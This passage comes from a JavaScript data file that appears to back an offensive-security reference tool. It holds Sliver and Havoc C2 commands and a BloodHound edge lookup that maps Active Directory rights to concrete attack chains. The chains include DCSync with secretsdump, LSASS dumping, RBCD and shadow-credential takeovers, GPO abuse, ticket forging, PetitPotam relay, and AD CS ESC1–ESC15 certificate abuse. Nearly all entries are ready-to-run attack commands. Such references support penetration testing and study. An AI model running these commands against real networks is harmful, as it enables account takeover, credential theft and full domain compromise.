    useCase: "Same pivoting role as the Ligolo-ng/SSH entries in Pivoting, but reusing the already-implanted C2 session instead of staging a second tool.",
  },
  {
    id: "sliver-portfwd",
    tool: "Sliver",
    phase: "c2",
    title: "Port forward through a session",
    command: "portfwd add --remote 127.0.0.1:445 --bind 0.0.0.0:1445",
    description: "Forwards a port on the operator box to a destination only reachable from the session's network position — narrower and quieter than a full SOCKS proxy when only one specific service is needed.",
    useCase: "Reaching one internal service (e.g. SMB on a DC only visible from this foothold) without opening a general-purpose pivot.",
  },
  {
    id: "sliver-execute-assembly",
    tool: "Sliver",
    phase: "c2",
    title: "Run a .NET assembly in-memory via a session",
    command: "execute-assembly /path/Rubeus.exe kerberoast",
    description: "Loads and runs a .NET tool (Rubeus, SharpHound, Certify, etc.) entirely in-memory inside the session — the standard way to run this reference's Windows tooling through an active C2 implant instead of dropping the binary to disk.",
    useCase: "Running any of this project's Rubeus/Certify/SharpHound entries through an existing Sliver foothold without touching disk.",
  },

  // ============ C2 FRAMEWORKS — Havoc ============
  {
    id: "havoc-teamserver-start",
    tool: "Havoc",
    phase: "c2",
    title: "Start the Havoc teamserver",
    command: "./havoc server --profile ./profiles/havoc.yaotl -v",
    description: "Launches the Havoc teamserver from a YAML profile defining listeners and operator accounts — the server component agents (Demons) check in to.",
    useCase: "First step of any Havoc engagement, run once on attacker-controlled infrastructure before connecting a client.",
  },
  {
    id: "havoc-client-connect",
    tool: "Havoc",
    phase: "c2",
    title: "Connect the Havoc client",
    command: "./havoc client",
    description: "Launches the GUI client and connects to a running teamserver — listener setup and Demon (payload) generation happen through this UI, matching AdaptixC2's client/teamserver split.",
    useCase: "Multi-operator collaboration against the same teamserver.",
  },
  {
    id: "havoc-socks",
    tool: "Havoc",
    phase: "c2",
    title: "Start a SOCKS proxy through a Demon",
    command: "socks start 1080",
    description: "Run from a Demon's interactive console — same pivoting role as Sliver's socks5/AdaptixC2's socks commands, tunneling proxy-aware tools through the compromised host.",
    useCase: "Reaching internal segments only visible from the Demon's foothold. Exact console syntax can shift between releases — check the Demon console's command list if this doesn't match.",
  },
  {
    id: "havoc-rportfwd",
    tool: "Havoc",
    phase: "c2",
    title: "Reverse port forward through a Demon",
    command: "rportfwd add 445 127.0.0.1 445",
    description: "Binds a port on the Demon's host and forwards connections back through it, the same role AdaptixC2's rportfwd/Sliver's portfwd play — useful for catching a callback from deeper in a pivoted network.",
    useCase: "Exposing a listener to a segment the Demon can reach but the operator can't, reusing the existing implant instead of staging Ligolo-ng/Chisel.",
  },
  {
    id: "havoc-shell",
    tool: "Havoc",
    phase: "c2",
    title: "Run a shell command via a Demon",
    command: "shell whoami /all",
    description: "Runs a single command through cmd.exe on the Demon's host and returns the output — the quickest way to confirm context/privileges right after a Demon checks in.",
    useCase: "Sanity-checking a fresh callback's identity and privilege level before deciding which post-ex module to run next.",
  },

];

// ============================================================
// EDGE LOOKUP — BloodHound edge name -> connected abuse chain
// Type an edge name (e.g. "GenericWrite") to get the mapped steps.
// ============================================================
const EDGE_CATEGORIES = [
  { id: "acl", label: "ACL / Object Rights", color: "#5B9BD5" },
  { id: "credread", label: "Credential Read", color: "#E0A937" },
  { id: "deleg", label: "Delegation", color: "#A57BD8" },
  { id: "local", label: "Local Access", color: "#3FBFA6" },
  { id: "gpo", label: "GPO / Trust", color: "#E06C5C" },
  { id: "adcs", label: "AD CS", color: "#8A9199" },
  { id: "info", label: "Informational", color: STRUCTURAL },
];

const edgeCategoryOf = (id) => EDGE_CATEGORIES.find((c) => c.id === id);

const EDGES = [
  // ---------------- ACL / Object Rights ----------------
  {
    id: "GenericAll-User",
    name: "GenericAll",
    target: "User",
    category: "acl",
    grants: "Full control of the user object — every property, including password and credential attributes.",
    steps: [
      "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS set password $TARGETOBJECT 'NewPassw0rd!'",
      "# or, quieter — take over without touching the password:",
      "certipy shadow auto -u $USER@$DOMAIN -p $PASS -account $TARGETOBJECT -dc-ip $DC",
    ],
    impact: "Complete takeover of the target account.",
  },
  {
    id: "GenericAll-Group",
    name: "GenericAll",
    target: "Group",
    category: "acl",
    grants: "Full control of the group object, including membership.",
    steps: ["bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add groupMember $TARGETOBJECT $USER"],
    impact: "Join any group you have GenericAll on — including privileged ones.",
  },
  {
    id: "GenericAll-Computer",
    name: "GenericAll",
    target: "Computer",
    category: "acl",
    grants: "Full control of the computer object, including its delegation attribute.",
    steps: [
      "rbcd.py -delegate-to '$TARGETOBJECT$' -delegate-from 'ATTACKER$' -action write $DOMAIN/$USER:$PASS",
      "getST.py -spn cifs/$TARGET $DOMAIN/'ATTACKER$':'Passw0rd!' -impersonate administrator",
    ],
    impact: "RBCD self-grant → impersonate any user on that computer via S4U2Proxy.",
  },
  {
    id: "GenericWrite-User",
    name: "GenericWrite",
    target: "User",
    category: "acl",
    grants: "Write access to most non-protected attributes on the user — enough to plant Shadow Credentials.",
    steps: ["certipy shadow auto -u $USER@$DOMAIN -p $PASS -account $TARGETOBJECT -dc-ip $DC"],
    impact: "Passwordless takeover via PKINIT, without ever resetting the account's password.",
  },
  {
    id: "GenericWrite-Group",
    name: "GenericWrite",
    target: "Group",
    category: "acl",
    grants: "Write access to the group's member attribute.",
    steps: ["bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add groupMember $TARGETOBJECT $USER"],
    impact: "Same result as GenericAll on a group — add yourself as a member.",
  },
  {
    id: "GenericWrite-Computer",
    name: "GenericWrite",
    target: "Computer",
    category: "acl",
    grants: "Write access to most attributes on the computer object, including msDS-AllowedToActOnBehalfOfOtherIdentity.",
    steps: ["rbcd.py -delegate-to '$TARGETOBJECT$' -delegate-from 'ATTACKER$' -action write $DOMAIN/$USER:$PASS"],
    impact: "RBCD abuse — impersonate any user against that computer.",
  },
  {
    id: "WriteOwner",
    name: "WriteOwner",
    target: "Any object",
    category: "acl",
    grants: "Ability to change the object's owner to yourself.",
    steps: [
      "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS set owner $TARGETOBJECT $USER",
      "# then, as the new owner, grant yourself GenericAll and follow that edge's chain:",
      "dacledit.py -action write -rights FullControl -principal $USER -target $TARGETOBJECT $DOMAIN/$USER:$PASS",
    ],
    impact: "Stepping stone into GenericAll on the same object.",
  },
  {
    id: "WriteDacl",
    name: "WriteDacl",
    target: "Any object",
    category: "acl",
    grants: "Ability to modify the object's ACL directly, without needing ownership first.",
    steps: ["dacledit.py -action write -rights FullControl -principal $USER -target $TARGETOBJECT $DOMAIN/$USER:$PASS"],
    impact: "Grants yourself GenericAll on the object in one step, then follow that edge's chain.",
  },
  {
    id: "Owns",
    name: "Owns",
    target: "Any object",
    category: "acl",
    grants: "You are already the owner of the object — owners can write the DACL even without explicit WriteDacl.",
    steps: ["dacledit.py -action write -rights FullControl -principal $USER -target $TARGETOBJECT $DOMAIN/$USER:$PASS"],
    impact: "Same chain as WriteDacl — grant yourself full control, then abuse the object type's edge.",
  },
  {
    id: "ForceChangePassword",
    name: "ForceChangePassword",
    target: "User",
    category: "acl",
    grants: "Right to reset the target's password without knowing the current one.",
    steps: ["bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS set password $TARGETOBJECT 'NewPassw0rd!'"],
    impact: "Immediate account takeover — but a loud one, since the real user's access breaks.",
  },
  {
    id: "AddMember",
    name: "AddMember",
    target: "Group",
    category: "acl",
    grants: "Right to add principals to the group's membership specifically.",
    steps: ["bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add groupMember $TARGETOBJECT $USER"],
    impact: "Join the target group directly.",
  },
  {
    id: "AddSelf",
    name: "AddSelf",
    target: "Group",
    category: "acl",
    grants: "Right to add yourself specifically (a narrower form of AddMember).",
    steps: ["bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add groupMember $TARGETOBJECT $USER"],
    impact: "Same as AddMember when the principal being added is you.",
  },
  {
    id: "AllExtendedRights-User",
    name: "AllExtendedRights",
    target: "User",
    category: "acl",
    grants: "All extended AD rights on the object — includes password reset and, on some objects, Shadow Credentials writes.",
    steps: [
      "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS set password $TARGETOBJECT 'NewPassw0rd!'",
      "certipy shadow auto -u $USER@$DOMAIN -p $PASS -account $TARGETOBJECT -dc-ip $DC",
    ],
    impact: "Functionally similar to ForceChangePassword + shadow-credential capability combined.",
  },
  {
    id: "WriteSPN",
    name: "WriteSPN",
    target: "User",
    category: "acl",
    grants: "Right to add a Service Principal Name to an account that doesn't already have one.",
    steps: [
      "targetedKerberoast.py -d $DOMAIN -u $USER -p $PASS --dc-ip $DC",
      "hashcat -m 13100 $OUTFILE wordlist.txt",
    ],
    impact: "Turns any writable user into a kerberoastable target on demand, even if it never had an SPN before.",
  },
  {
    id: "WriteAccountRestrictions",
    name: "WriteAccountRestrictions",
    target: "User / Computer",
    category: "acl",
    grants: "Write access to userAccountControl-adjacent attributes, including msDS-AllowedToDelegateTo.",
    steps: ["bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS set object $TARGETOBJECT msDS-AllowedToDelegateTo -v 'cifs/$DC'"],
    impact: "Self-grant constrained delegation rights, then abuse via the AllowedToDelegate chain.",
  },
  {
    id: "AddKeyCredentialLink",
    name: "AddKeyCredentialLink",
    target: "User / Computer",
    category: "acl",
    grants: "Write access to msDS-KeyCredentialLink specifically — the Shadow Credentials attribute.",
    steps: ["certipy shadow auto -u $USER@$DOMAIN -p $PASS -account $TARGETOBJECT -dc-ip $DC"],
    impact: "Passwordless takeover via PKINIT certificate authentication.",
  },

  // ---------------- Credential Read ----------------
  {
    id: "ReadLAPSPassword",
    name: "ReadLAPSPassword",
    target: "Computer",
    category: "credread",
    grants: "Read access to the LAPS-managed local administrator password attribute.",
    steps: [
      "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get object $TARGETOBJECT --attr ms-Mcs-AdmPwd,msLAPS-Password",
    ],
    impact: "Local admin password for that computer — direct local admin access.",
  },
  {
    id: "ReadGMSAPassword",
    name: "ReadGMSAPassword",
    target: "Group Managed Service Account",
    category: "credread",
    grants: "Read access to msDS-ManagedPassword — the gMSA's auto-rotated password blob.",
    steps: ["gMSADumper.py -u $USER -p $PASS -d $DOMAIN"],
    impact: "Current password/NTLM hash of the gMSA — impersonate the service account directly.",
  },
  {
    id: "DumpSMSAPassword",
    name: "DumpSMSAPassword",
    target: "Delegated Managed Service Account (dMSA)",
    category: "credread",
    grants: "Read access to a dMSA's msDS-ManagedPassword — the same auto-rotated credential blob gMSAs use, but on the Windows Server 2025 dMSA object type BadSuccessor also targets.",
    steps: ["gMSADumper.py -u $USER -p $PASS -d $DOMAIN"],
    impact: "Current password/NTLM hash of the dMSA — and if it's actively preceding a privileged account (see BadSuccessor), that account's effective privilege too.",
  },
  {
    id: "SyncLAPSPassword",
    name: "SyncLAPSPassword",
    target: "Computer",
    category: "credread",
    grants: "Right to read the confidential LAPS password attribute via replication-style access.",
    steps: ["bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get object $TARGETOBJECT --attr ms-Mcs-AdmPwd,msLAPS-Password"],
    impact: "Same outcome as ReadLAPSPassword — local admin credential disclosure.",
  },
  {
    id: "DCSync",
    name: "DCSync (GetChanges + GetChangesAll)",
    target: "Domain",
    category: "credread",
    grants: "Replicating Directory Changes + Replicating Directory Changes All on the domain object.",
    steps: ["secretsdump.py $DOMAIN/$USER:$PASS@$DC -just-dc"],
    impact: "Every password hash in the domain, including krbtgt — full domain compromise.",
  },
  {
    id: "GetChangesInFilteredSet",
    name: "GetChangesInFilteredSet",
    target: "Domain",
    category: "credread",
    grants: "Partial replication rights limited to a filtered attribute set (commonly seen with RODC-related accounts).",
    steps: ["secretsdump.py $DOMAIN/$USER:$PASS@$DC -just-dc-user $TARGETOBJECT"],
    impact: "Narrower than full DCSync, but still leaks specific account secrets depending on the filtered set.",
  },
  {
    id: "RODCRevealGroupAbuse",
    name: "Rights on RODC object",
    target: "RODC Computer Object",
    category: "acl",
    grants: "GenericAll/FullControl, GenericWrite, WriteDacl, Owns, or WriteOwner on the RODC's own computer object — any one of these implicitly grants WriteProperty over its msDS-RevealOnDemandGroup and msDS-NeverRevealGroup attributes (WriteOwner via Owns→WriteDacl→WriteProperty; WriteDacl/Owns directly).",
    steps: [
      "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS set object $TARGETOBJECT --attr msDS-RevealOnDemandGroup -v 'CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local' -v 'CN=Administrator,CN=Users,DC=domain,DC=local'",
      "# If needed, clear msDS-NeverRevealGroup so the target account isn't excluded:",
      "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS set object $TARGETOBJECT --attr msDS-NeverRevealGroup",
    ],
    impact: "A targeted Domain Admin account's credentials become eligible for caching on the RODC — combined with admin access to the RODC host itself, this leads to dumping krbtgt_XXXXX and a key-list attack for the DA's actual password hash.",
  },

  // ---------------- Delegation ----------------
  {
    id: "AllowedToDelegate",
    name: "AllowedToDelegate",
    target: "Computer",
    category: "deleg",
    grants: "The source principal is trusted for constrained delegation to specific services on the target.",
    steps: [
      "Rubeus.exe s4u /user:$USER /rc4:$HASH /impersonateuser:administrator /msdsspn:cifs/$TARGETOBJECT /ptt",
    ],
    impact: "Impersonate any user (commonly Administrator) against the specific delegated service.",
  },
  {
    id: "AddAllowedToAct",
    name: "AddAllowedToAct (RBCD)",
    target: "Computer",
    category: "deleg",
    grants: "Write access to msDS-AllowedToActOnBehalfOfOtherIdentity — lets you configure RBCD onto the target.",
    steps: [
      "rbcd.py -delegate-to '$TARGETOBJECT$' -delegate-from 'ATTACKER$' -action write $DOMAIN/$USER:$PASS",
      "getST.py -spn cifs/$TARGET $DOMAIN/'ATTACKER$':'Passw0rd!' -impersonate administrator",
    ],
    impact: "Impersonate any user against the target computer via S4U2Self + S4U2Proxy.",
  },
  {
    id: "HasSIDHistory",
    name: "HasSIDHistory",
    target: "User",
    category: "deleg",
    grants: "The account carries a SID in its history, usually from a migrated identity, inheriting that SID's rights too.",
    steps: ["ticketer.py -nthash $HASH -domain-sid $SID -domain $DOMAIN -extra-sid $SID-519 administrator"],
    impact: "Rights of the historical SID apply — if it belonged to a privileged group, so do you.",
  },

  // ---------------- Local Access ----------------
  {
    id: "AdminTo",
    name: "AdminTo",
    target: "Computer",
    category: "local",
    grants: "Local Administrators group membership on the target computer.",
    steps: ["psexec.py $DOMAIN/$USER:$PASS@$TARGET", "nxc smb $TARGET -u $USER -p $PASS -M lsassy"],
    impact: "Full local control — code execution, credential dumping, service manipulation.",
  },
  {
    id: "CanRDP",
    name: "CanRDP",
    target: "Computer",
    category: "local",
    grants: "Membership in the Remote Desktop Users group (or equivalent) on the target.",
    steps: ["xfreerdp /u:$USER /p:$PASS /d:$DOMAIN /v:$TARGET"],
    impact: "Interactive desktop session — useful for manual recovery of cached data or GUI-only tooling.",
  },
  {
    id: "CanPSRemote",
    name: "CanPSRemote",
    target: "Computer",
    category: "local",
    grants: "Membership in Remote Management Users (or local admin) allowing WinRM access.",
    steps: ["evil-winrm -i $TARGET -u $USER -p $PASS"],
    impact: "Interactive PowerShell session on the target.",
  },
  {
    id: "ExecuteDCOM",
    name: "ExecuteDCOM",
    target: "Computer",
    category: "local",
    grants: "Membership in Distributed COM Users, enabling remote DCOM object instantiation.",
    steps: ["dcomexec.py $DOMAIN/$USER:$PASS@$TARGET"],
    impact: "Command execution via DCOM — an alternative to psexec/wmiexec that's sometimes less monitored.",
  },
  {
    id: "SQLAdmin",
    name: "SQLAdmin",
    target: "Computer (SQL Server)",
    category: "local",
    grants: "sysadmin role on a MSSQL instance running on the target.",
    steps: ["mssqlclient.py $DOMAIN/$USER:$PASS@$TARGET -windows-auth", "EXEC xp_cmdshell 'whoami';"],
    impact: "OS-level command execution via xp_cmdshell, typically as the SQL Server service account.",
  },
  {
    id: "HasSession",
    name: "HasSession",
    target: "Computer",
    category: "info",
    grants: "Informational — a privileged user currently has a logon session on this computer.",
    steps: ["nxc smb $TARGET -u $USER -p $PASS -M lsassy"],
    impact: "If you also have AdminTo on the same box, dumping LSASS here can harvest that user's credentials.",
  },
  {
    id: "MemberOf",
    name: "MemberOf",
    target: "Group",
    category: "info",
    grants: "Informational — shows nested group membership, which is how most privilege inherits silently.",
    steps: ["# No direct abuse — walk the graph: rights granted to the group apply to every member, including nested ones."],
    impact: "Explains why an account has rights that aren't directly assigned to it.",
  },
  {
    id: "Contains",
    name: "Contains",
    target: "OU / Container",
    category: "info",
    grants: "Informational — shows organizational containment (OU structure), relevant for GPO scope.",
    steps: ["# No direct abuse — relevant for scoping which GPOs and delegated OU rights apply to an object."],
    impact: "Context for GPO-linked attacks and delegated OU permissions.",
  },

  // ---------------- GPO / Trust ----------------
  {
    id: "GPLink",
    name: "GPLink / WriteGPLink",
    target: "OU",
    category: "gpo",
    grants: "Right to link a Group Policy Object to an OU, or the OU already has a GPO you control linked to it.",
    steps: ["SharpGPOAbuse.exe --AddComputerTask --TaskName 'Update' --Author $DOMAIN\\\\$USER --Command cmd.exe --Arguments '/c net localgroup administrators $USER /add' --GPOName 'VulnGPO'"],
    impact: "Push a scheduled task or startup script to every computer/user the GPO applies to — mass compromise.",
  },
  {
    id: "TrustedBy",
    name: "TrustedBy",
    target: "Domain",
    category: "gpo",
    grants: "Another domain/forest trusts this one — direction and SID-filtering status determine abuse potential.",
    steps: ["ticketer.py -nthash $HASH -domain-sid $SID -domain $DOMAIN -extra-sid $SID-519 -sid $SID administrator"],
    impact: "With SID filtering disabled, forge a ticket carrying an Enterprise Admins SID from the trusting side.",
  },

  // ---------------- AD CS edges ----------------
  {
    id: "ADCSESC1",
    name: "ADCS ESC1",
    target: "Certificate Template",
    category: "adcs",
    grants: "Template allows enrollee-supplied SAN + client authentication EKU + low-priv enrollment rights.",
    steps: [
      "certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC -ca 'CA-NAME' -template 'VulnTemplate' -upn administrator@$DOMAIN",
      "certipy auth -pfx $OUTFILE.pfx -dc-ip $DC",
    ],
    impact: "Impersonate any user, typically Domain Admin, by requesting a certificate in their name.",
  },
  {
    id: "ADCSESC2",
    name: "ADCS ESC2",
    target: "Certificate Template",
    category: "adcs",
    grants: "Template has the Any Purpose EKU or no EKU restriction, so the resulting cert can be used for client auth too.",
    steps: [
      "certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC -ca 'CA-NAME' -template 'AnyPurposeTemplate'",
      "certipy auth -pfx $OUTFILE.pfx -dc-ip $DC",
    ],
    impact: "Similar outcome to ESC1 or, combined with agent EKU, ESC3 — flexible cert abuse.",
  },
  {
    id: "ADCSESC3",
    name: "ADCS ESC3",
    target: "Certificate Template",
    category: "adcs",
    grants: "Template has the Certificate Request Agent EKU, letting the holder request certs on behalf of other users.",
    steps: [
      "certipy req -u $USER@$DOMAIN -p $PASS -ca 'CA-NAME' -template 'EnrollmentAgent'",
      "certipy req -u $USER@$DOMAIN -p $PASS -ca 'CA-NAME' -template 'User' -on-behalf-of '$DOMAIN\\administrator' -pfx agent.pfx",
    ],
    impact: "Mint a certificate for any target user without ever touching their account.",
  },
  {
    id: "ADCSESC4",
    name: "ADCS ESC4",
    target: "Certificate Template",
    category: "adcs",
    grants: "Write access to the certificate template object itself (WriteOwner/WriteDacl/GenericWrite on the template).",
    steps: ["certipy template -u $USER@$DOMAIN -p $PASS -template 'VulnTemplate' -save-old"],
    impact: "Reconfigure the template into an ESC1-exploitable state, then follow the ESC1 chain.",
  },
  {
    id: "ADCSESC5",
    name: "ADCS ESC5",
    target: "PKI object (CA / NTAuthCertificates / Enrollment Services container)",
    category: "adcs",
    grants: "Write access to a PKI-related AD object other than the template itself — the CA object, the NTAuthCertificates object, or the Enrollment Services / Public Key Services container.",
    steps: [
      "certutil -dspublish -f rogue_ca.crt NTAuthCA",
      "certutil -dspublish -f rogue_ca.crt RootCA",
      "# Once your CA cert is domain-trusted, forge certificates for anyone entirely offline:",
      "certipy forge -ca-pfx rogue_ca.pfx -upn administrator@$DOMAIN -subject 'CN=administrator,CN=Users,DC=corp,DC=local'",
    ],
    impact: "Publishes your own rogue CA as domain-trusted — same end state as stealing a legitimate CA's private key, entirely from an AD write primitive.",
  },
  {
    id: "ADCSESC6",
    name: "ADCS ESC6",
    target: "Certificate Authority",
    category: "adcs",
    grants: "CA has the EDITF_ATTRIBUTESUBJECTALTNAME2 flag set (the 'User Specified SAN' setting), allowing SAN to be specified at request time on any enrollable, authentication-capable template — the default User template already qualifies. Patched environments enforce szOID_NTDS_CA_SECURITY_EXT (KB5014754), which blocks this unless StrongCertificateBindingEnforcement is set to 0.",
    steps: [
      "certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -stdout | grep \"User Specified SAN\"",
      "certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC -ca 'CA-NAME' -template 'User' -upn administrator@$DOMAIN",
      "# Or impersonate a computer instead: -template 'Machine' -dns $DC",
    ],
    impact: "Turns effectively every enrollable, auth-capable template into ESC1, domain-wide.",
  },
  {
    id: "ADCSESC7",
    name: "ADCS ESC7 (CA Access Control)",
    target: "Certificate Authority",
    category: "adcs",
    grants: "ManageCA (\"CA administrator\") or ManageCertificates (\"Certificate Manager\"/Officer) rights on the CA object — two separate exploitation paths depending on which combination you hold and whether CertSvc can be restarted.",
    steps: [
      "# Path 1 — ManageCA + ability to restart CertSvc: flip the CA into ESC6 directly",
      "certipy ca -u $USER@$DOMAIN -p $PASS -ca 'CA-NAME' -dc-ip $DC -enable-template 'SubCA'",
      "# Path 2 — ManageCA only, can't restart CertSvc: abuse the restricted SubCA template via a failed-then-approved request",
      "certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC -ca 'CA-NAME' -template 'SubCA' -upn administrator@$DOMAIN",
      "certipy ca -u $USER@$DOMAIN -p $PASS -ca 'CA-NAME' -dc-ip $DC -issue-request <request-ID-from-above>",
      "certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC -ca 'CA-NAME' -retrieve <request-ID-from-above>",
    ],
    impact: "Path 1 re-enables/exposes a CA-wide ESC6 condition directly. Path 2 needs both ManageCA (to approve) and ManageCertificates (\"Officer\" — grantable via ManageCA) together: SubCA normally rejects standard users with CERTSRV_E_TEMPLATE_DENIED but still issues a request ID, which ManageCA+ManageCertificates can then approve and retrieve despite the denial.",
  },
  {
    id: "ADCSESC8",
    name: "ADCS ESC8",
    target: "Certificate Authority (Web Enrollment)",
    category: "adcs",
    grants: "AD CS Web Enrollment (HTTP) is enabled and NTLM relay to it is possible.",
    steps: [
      "certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -stdout | grep -B20 ESC8",
      "python3 PetitPotam.py -d $DOMAIN -u $USER -p $PASS $ATTACKER $DC",
      "certipy relay -ca $DC -template DomainController",
    ],
    impact: "Coerce a machine account (often the DC itself) to authenticate, relay it into a certificate — impersonation is limited to whichever account got coerced, so escalation to admin depends on coercing a privileged one (a DC or Exchange server, not just any machine).",
  },
  {
    id: "ADCSESC9",
    name: "ADCS ESC9",
    target: "Certificate Template + User Account",
    category: "adcs",
    grants: "Template has the security extension disabled (CT_FLAG_NO_SECURITY_EXTENSION) AND you hold write access to a victim's userPrincipalName attribute.",
    steps: [
      "certipy account update -u $USER@$DOMAIN -p $PASS -user $TARGETOBJECT -upn administrator",
      "certipy req -u $TARGETOBJECT@$DOMAIN -p $PASS -ca 'CA-NAME' -template 'NoSecurityExtensionTemplate'",
      "certipy account update -u $USER@$DOMAIN -p $PASS -user $TARGETOBJECT -upn $TARGETOBJECT",
      "certipy auth -pfx $OUTFILE.pfx -domain $DOMAIN",
    ],
    impact: "The certificate — issued for a low-privilege account you control — authenticates as administrator instead, because the cert carries no embedded SID and the UPN was temporarily spoofed to match.",
  },
  {
    id: "ADCSESC10",
    name: "ADCS ESC10",
    target: "Domain Controller (weak cert mapping) + User Account",
    category: "adcs",
    grants: "The domain controller's StrongCertificateBindingEnforcement setting is weak/compatibility mode AND you hold write access to a victim's userPrincipalName attribute.",
    steps: [
      "certipy account update -u $USER@$DOMAIN -p $PASS -user $TARGETOBJECT -upn administrator",
      "certipy req -u $TARGETOBJECT@$DOMAIN -p $PASS -ca 'CA-NAME' -template 'User'",
      "certipy account update -u $USER@$DOMAIN -p $PASS -user $TARGETOBJECT -upn $TARGETOBJECT",
      "certipy auth -pfx $OUTFILE.pfx -domain $DOMAIN",
    ],
    impact: "Same UPN-spoofing impersonation outcome as ESC9, but rooted in a DC-side registry weakness rather than the template's security-extension setting — a normal, otherwise-fine template can still be abused.",
  },
  {
    id: "ADCSESC11",
    name: "ADCS ESC11",
    target: "Certificate Authority (RPC Enrollment)",
    category: "adcs",
    grants: "The CA's RPC (ICPR) enrollment interface doesn't enforce Extended Protection, so NTLM relay works over RPC even without HTTP web enrollment enabled — requires the IF_ENFORCEENCRYPTICERTREQUEST packet-privacy flag to be off, which is not the default.",
    steps: [
      "certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -stdout | grep -B20 ESC11",
      "python3 PetitPotam.py -d $DOMAIN -u $USER -p $PASS $ATTACKER $DC",
      "certipy relay -target 'rpc://$DC' -ca 'CA-NAME'",
    ],
    impact: "Same outcome as ESC8 — a certificate for the coerced machine account — via a transport that's easy to miss if only the HTTP endpoint was hardened.",
  },
  {
    id: "ADCSESC12",
    name: "ADCS ESC12",
    target: "Certificate Authority (Private Key)",
    category: "adcs",
    grants: "The CA's private key material is stored somewhere weakly protected — a Shell PKI object, or an external HSM (e.g. a YubiHSM2) left at its default PIN. On a YubiHSM-backed CA, the Key Storage Provider's authentication key is stored in cleartext in the registry at HKLM\\SOFTWARE\\Yubico\\YubiHSM\\AuthKeysetPassword, readable by any process regardless of which account it runs as.",
    steps: [
      "certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -vulnerable",
      "# Flags ESC12 automatically. With shell access to the CA server (even low-privileged), read the AuthKeysetPassword registry value above, then use it to sign a forged ESC1-style certificate directly through the YubiHSM.",
    ],
    impact: "Direct access to the CA's private signing key — see GoldenCert below for what that unlocks.",
  },
  {
    id: "ADCSESC13",
    name: "ADCS ESC13",
    target: "Certificate Template",
    category: "adcs",
    grants: "An enrollable template's issuance policy OID is linked (via msDS-OIDToGroupLink) to a privileged group — enrolling maps you into that group without ever touching its membership.",
    steps: [
      "certipy req -u $USER@$DOMAIN -p $PASS -ca 'CA-NAME' -template 'OIDLinkedTemplate'",
      "certipy auth -pfx $OUTFILE.pfx -dc-ip $DC",
    ],
    impact: "Effective membership in whatever group the issuance policy is linked to — a group-membership edge disguised as a certificate template.",
  },
  {
    id: "GoldenCert",
    name: "GoldenCert (CA Private Key Theft)",
    target: "Certificate Authority",
    category: "adcs",
    grants: "Full local admin on the CA server itself — enough to export its private signing key directly.",
    steps: [
      "certipy ca -u $USER@$DOMAIN -p $PASS -ca 'CA-NAME' -backup",
      "certipy forge -ca-pfx ca.pfx -upn administrator@$DOMAIN -subject 'CN=administrator,CN=Users,DC=corp,DC=local'",
    ],
    impact: "Forge a valid certificate for any user, entirely offline, bypassing every template restriction — the CA's own key signs it, so nothing about template EKUs or enrollment rights applies.",
  },
  {
    id: "ADCSESC14",
    name: "ADCS ESC14 (Weak Explicit Mapping)",
    target: "User/Computer Object (altSecurityIdentities)",
    category: "adcs",
    grants: "Write access to a target's altSecurityIdentities attribute (via WriteProperty on it specifically, Write-Property-all, WriteDacl, WriteOwner, GenericWrite/GenericAll, or ownership) lets you point an explicit certificate mapping at a certificate you already hold — no template misconfiguration needed at all, just enrollment on any authentication-capable template as yourself.",
    steps: [
      "certipy req -u $USER@$DOMAIN -p $PASS -ca 'CA-NAME' -template 'User' -dc-ip $DC",
      "certipy cert -pfx user.pfx -nokey -out user.crt",
      "# Extract Issuer + Serial from user.crt (openssl x509 -in user.crt -noout -text), build 'X509:<I>...<SR>...', then add it to the target's altSecurityIdentities via ldap3/dacledit.py",
      "certipy auth -pfx user.pfx -domain $DOMAIN",
    ],
    impact: "Authenticate as the target account using a certificate you legitimately enrolled for yourself — entirely independent of the target's own template restrictions, since the mapping (not the certificate's identity fields) is what's being abused. ESC14-B/C/D are variants of the same idea targeting an existing weak X509RFC822/X509IssuerSubject/X509SubjectOnly mapping already present on the target instead of writing a new one.",
  },
  {
    id: "ADCSESC15",
    name: "ADCS ESC15 (EKUwu, CVE-2024-49019)",
    target: "Certificate Template (Schema v1)",
    category: "adcs",
    grants: "A schema version 1 template that allows SAN specification lets a requester embed an arbitrary Application Policy (which Windows treats as higher-priority than EKUs) into the CSR — including Certificate Request Agent — even though the template was never configured to allow it. Patched as CVE-2024-49019.",
    steps: [
      "certipy req -u $USER@$DOMAIN --application-policies '1.3.6.1.4.1.311.20.2.1' -ca 'CA-NAME' -template 'SchemaV1Template' -dc-ip $DC",
      "certipy req -u $USER@$DOMAIN -on-behalf-of '$DOMAIN\\\\Administrator' -template 'User' -ca 'CA-NAME' -pfx cert.pfx -dc-ip $DC",
      "certipy auth -pfx administrator.pfx -dc-ip $DC",
    ],
    impact: "Chains into an ESC3-style Certificate Request Agent certificate, then requests a certificate on behalf of any user — full domain compromise from a schema v1 template that looked harmless. Specifying 'Client Authentication' directly only enables Schannel, not PKINIT, so the Request Agent + on-behalf-of route is the one that actually works end-to-end.",
  },
  {
    id: "ADCSESC16",
    name: "ADCS ESC16 (CA-Wide Security Extension Disabled)",
    target: "Certificate Authority (Security Extension)",
    category: "adcs",
